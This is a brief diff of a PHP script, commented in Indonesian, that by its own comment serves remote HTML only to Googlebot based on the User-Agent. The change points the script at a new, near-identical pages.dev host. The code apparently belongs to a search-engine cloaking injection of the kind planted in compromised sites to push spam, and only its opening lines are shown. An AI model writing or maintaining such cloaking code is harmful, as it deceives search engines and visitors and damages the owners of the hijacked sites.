@@ -1,7 +1,7 @@
 <?php
 // ==== Serve remote .txt HTML only for Googlebot (sederhana) ====
 
-$REMOTE_URL = 'https://visi-misi-ledan.pages.dev/';
+$REMOTE_URL = 'https://visi-misi-ledann.pages.dev/';
 
 // Fungsi cek sederhana (User-Agent saja)
 function is_googlebot(): bool {
